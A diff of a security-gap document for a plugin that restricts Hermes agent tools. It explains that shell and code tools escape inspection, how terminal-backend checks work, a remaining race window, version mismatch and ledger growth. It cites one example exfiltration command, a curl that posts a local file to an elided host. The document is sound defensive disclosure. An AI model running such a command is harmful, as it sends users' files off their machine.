@@ -153,8 +153,8 @@ can block it.
 
 ## 3. Shell and code-execution tools are not inspected
 
-**The gap.** `terminal`, `process_manage` and `execute_code` run on this host, and they can open any
-network connection. They run on this host only on Hermes' `local` terminal backend. A command such as `curl -d @notes.txt https://...` sends a file off the machine.
+**The gap.** On Hermes' `local` terminal backend, `terminal`, `process_manage` and `execute_code`
+run on this host, and they can open any network connection. A command such as `curl -d @notes.txt https://...` sends a file off the machine.
 
 **Why it exists.** Hermes gives a plugin the command string. It does not tell the plugin what the
 command will connect to. Guessing from command text is unreliable.
@@ -165,11 +165,19 @@ paragraph of every receipt says that shell and code tools are not covered.
 The terminal backend decides where these tools run. It is set by `terminal.backend` in `config.yaml`,
 or by the `TERMINAL_ENV` environment variable when the config does not set it. On `ssh`, `modal`,
 `managed_modal`, `daytona`, `vercel_sandbox`, `docker` or a plugin backend, these three tools run in
-a container or on another machine. So do `read_file`, `write_file`, `patch` and `search_files`. The
-preflight therefore refuses to lock unless both sources say `local`, and its row names the backend
-it found and the key to change. The tool gate checks the backend again on each call to one of the
-seven tools. That check covers a backend that code registers for one task. A call on another backend
-is blocked.
+a container or on another machine. So do `read_file`, `write_file`, `patch` and `search_files`. These
+seven are the terminal-backend tools. The preflight refuses to lock unless `terminal.backend` and
+the backend Hermes resolves for the profile are both `local`, and its row names the backend it found
+and the key to change. The plugin resolves the backend the way Hermes' tools do. On a gateway that
+serves several profiles, that is the profile's own terminal scope, not the process environment. The
+lock is also refused while Hermes holds a cached terminal environment on a non-local backend. The
+tool gate checks again on each call to one of the seven tools: the resolved backend and the
+environment cached for the call's task must both be `local`, or the call is blocked.
+
+One window remains. Hermes can create a new environment for a task between the plugin's per-call
+check and the tool's own start, if the backend changed in that instant. The next call is then
+blocked, because the cached environment is no longer local. Only that one call runs on the other
+backend.
 
 A three-mode rule is reserved in the code but not shipped (`gate_tools.MODE_TOOLS`). The three modes
 would be: ask on commands that look like network access, allow all, or block.
@@ -493,10 +501,18 @@ Each item below is a smaller gap. Each one is stated in full.
   Anyone who can edit it can add a tool for the current lock without a prompt or a ledger row; that
   is inside the stated trust boundary (section 6).
 
+- **Mixed plugin versions disagree about the lock.** The lock records a fingerprint of the routing
+  config, and this version added the terminal backend to it. A lock made by an earlier version still
+  matches. A process that still runs the earlier version, however, reads a lock made by this version
+  as a changed config. That process refuses every turn and marks the session breached. Restart every Hermes
+  process that loads the plugin after an upgrade (README, "Upgrading").
+
 - **The ledger grows without limit.** The plugin never deletes ledger rows. On the attested tier a
   `verify_ok` row with its evidence (about 15 KB for Tinfoil, about 100 KB for NEAR) is written every
   `confidential.verify_ttl_seconds` while sends continue. That is a few megabytes to tens of megabytes
-  a day. A receipt reads only its session's locked period, so rendering stays fast. To start a new
+  a day. A receipt reads the ledger from the last unlock before its session. A profile
+  that has never been unlocked therefore still reads from the start of the ledger, and rendering
+  slows as the file grows. To start a new
   ledger, unlock, render the receipts you want to keep, stop Hermes, and move `ledger.sqlite` aside.
   Hermes creates a new file at the next start.
 
